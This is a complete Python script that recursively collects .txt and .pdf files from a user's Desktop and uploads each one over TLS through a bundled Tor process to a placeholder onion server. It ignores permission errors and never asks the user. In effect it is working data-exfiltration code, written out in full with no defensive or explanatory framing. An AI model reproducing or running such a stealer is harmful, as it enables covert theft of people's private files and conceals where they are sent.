import ssl, base64, subprocess, socks
from io import BytesIO
from pathlib import Path

# Server's TLS certificate encoded in base64.
CERTIFICATE_BASE64 = "YOUR SERVER TLS CERTIFICATE"

# Function to load a TLS certificate from memory.
def load_certificate_from_memory(base64_cert):
    # Decode the base64 certificate.
    cert_data = base64.b64decode(base64_cert)
    # Wrap the certificate data in a BytesIO object for in-memory operations.
    cert_file = BytesIO(cert_data)
    # Create a default SSL context for server authentication.
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # Load the certificate into the context using its decoded content.
    context.load_verify_locations(cadata=cert_file.read().decode())
    return context

# Function to search for files with specific extensions in a given directory.
def search_files(base_path, extensions):
    base_path = Path(base_path)  # Convert the base path to a Path object.
    matching_files = []  # List to store matching files.
    try:
        # Normalize extensions to lowercase and strip extra spaces.
        extensions = [ext.strip().lower() for ext in extensions]
        # Iterate through extensions and find files recursively.
        for ext in extensions:
            for file in base_path.rglob(f"*{ext}"):
                # Resolve the file path and add it to the list.
                matching_files.append(str(file.resolve()))
    except PermissionError as e:
        # Ignore directories where permissions are restricted.
        pass
    return matching_files

# Function to start the Tor process.
def start_tor():
    # Launch the Tor executable with the specified SOCKS port.
    tor_process = subprocess.Popen(['tor/tor', '--SocksPort', '9050'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Read Tor's output until it indicates full bootstrap (100%).
    for line in iter(tor_process.stdout.readline, ''):
        print(line.strip())  # Print the output line for monitoring.
        if "Bootstrapped 100%" in line:
            break

    return tor_process  # Return the Tor process for later termination.

# Function to terminate the Tor process.
def stop_tor(tor_process):
    tor_process.terminate()  # Gracefully stop the Tor process.

# Function to send a file to a server through a secure socket.
def send_file(server_host, server_port, file_path, ssl_context):
    # Create a SOCKS5 proxy socket.
    sock = socks.socksocket()
    sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # Connect through Tor on localhost.
    sock.connect((server_host, server_port))  # Connect to the specified server.

    # Wrap the socket with SSL for secure communication.
    with ssl_context.wrap_socket(sock, server_hostname=server_host) as secure_sock:
        # Send the file name first.
        file_name = Path(file_path).name
        secure_sock.sendall(file_name.encode())  # Encode and send the file name.
        response = secure_sock.recv(1024)  # Receive the server's response.
        if response != b"OK":
            return  # Abort if the server response is not "OK".

        # Send the file in chunks.
        with open(file_path, "rb") as file:
            while chunk := file.read(65536):  # Read the file in 64 KB chunks.
                secure_sock.sendall(chunk)  # Send the chunk.
                response = secure_sock.recv(1024)  # Receive acknowledgment.
                if response != b"CHUNK_RECEIVED":
                    return  # Abort if the acknowledgment is incorrect.

        # Signal the end of the file transmission.
        secure_sock.sendall(b"EOF")

# Main program logic.
if __name__ == "__main__":
    tor_process = start_tor()  # Start the Tor process.
    try:
        # Server configuration.
        server_host = "yourdomain.onion"
        server_port = 444
        # Load the SSL context with the certificate.
        ssl_context = load_certificate_from_memory(CERTIFICATE_BASE64)

        # Directory and file extension configuration.
        dir_path = "/home/user/Desktop"
        extensions = ".txt, .pdf".split(",")  # List of file extensions to search for.
        files_to_send = search_files(dir_path, extensions)  # Find matching files.

        # Send each file to the server.
        for file_path in files_to_send:
            send_file(server_host, server_port, file_path, ssl_context)

    finally:
        # Ensure the Tor process is stopped when the program ends.
        stop_tor(tor_process)
